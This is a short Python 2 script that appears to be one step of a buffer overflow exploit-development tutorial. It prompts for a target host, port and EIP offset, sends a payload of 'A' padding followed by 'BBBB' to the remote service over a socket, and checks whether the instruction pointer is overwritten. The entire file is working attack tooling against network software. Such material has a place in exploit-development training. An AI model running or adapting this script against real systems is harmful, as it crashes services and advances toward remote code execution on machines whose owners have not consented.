#!/usr/bin/env python
import sys, os, socket

host = str(raw_input("Host: "))
port = int(raw_input("Port: "))

prefix = ''
suffix = '\n'

print "******************************"
print "Verify the prefix and suffix"
print "[+]Prefix: " + prefix
print "[+]Suffix: " + suffix
print "******************************"

offset = int(raw_input("Enter EIP offset from step 3_1: "))
eipOffset = "A" * offset + "BBBB"
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(15.0)
payload = prefix + eipOffset + suffix

try:
        print('Connecting...')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print('Sending...')
        s.send(payload)
        s.close()
        print('Sent Payload! Check if EIP=BBBB')
except:
        print('Failed to connect, try again')
